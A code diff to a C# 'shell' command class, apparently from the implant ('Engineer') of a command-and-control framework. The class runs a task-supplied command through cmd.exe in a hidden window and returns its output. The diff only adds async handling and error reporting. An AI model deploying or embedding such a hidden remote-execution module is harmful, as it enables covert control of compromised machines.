@@ -1,4 +1,5 @@
 ﻿using Engineer.Commands;
+using Engineer.Functions;
 using Engineer.Models;
 using System;
 using System.Collections.Generic;
@@ -14,43 +15,51 @@ namespace Engineer.Commands
     {
         public override string Name => "shell";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
-            task.Arguments.TryGetValue("/command", out string command);
-            if (command == null)
+            try
             {
-                return "No command specified";
-            }
-            command = command.TrimStart(' ');
-
-            var output = new StringBuilder();
-
-            var process = new Process
-            {
-                StartInfo = new ProcessStartInfo
+                task.Arguments.TryGetValue("/command", out string command);
+                if (command == null)
                 {
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    WorkingDirectory = Directory.GetCurrentDirectory(),
-                    FileName = "cmd.exe",
-                    Arguments = $"/c {command}",
-                    UseShellExecute = false,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true
+                    Tasking.FillTaskResults("No command specified", task, EngTaskStatus.FailedWithWarnings);
+                    return;
                 }
-            };
+                command = command.TrimStart(' ');
 
-            process.OutputDataReceived += (_, args) => { output.AppendLine(args.Data); };
-            process.ErrorDataReceived += (_, args) => { output.AppendLine(args.Data); };
+                var output = new StringBuilder();
 
-            process.Start();
-            process.BeginOutputReadLine();
-            process.BeginErrorReadLine();
-            process.WaitForExit();
+                var process = new Process
+                {
+                    StartInfo = new ProcessStartInfo
+                    {
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        WorkingDirectory = Directory.GetCurrentDirectory(),
+                        FileName = "cmd.exe",
+                        Arguments = $"/c {command}",
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true
+                    }
+                };
 
-            process.Dispose();
+                process.OutputDataReceived += (_, args) => { output.AppendLine(args.Data); };
+                process.ErrorDataReceived += (_, args) => { output.AppendLine(args.Data); };
 
-            return output.ToString();
+                process.Start();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
+                process.WaitForExit();
+
+                process.Dispose();
+
+                Tasking.FillTaskResults(output.ToString(), task, EngTaskStatus.Complete);
+            }
+            catch (Exception ex)
+            {
+                Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed);
+            }
         }
     }
 }
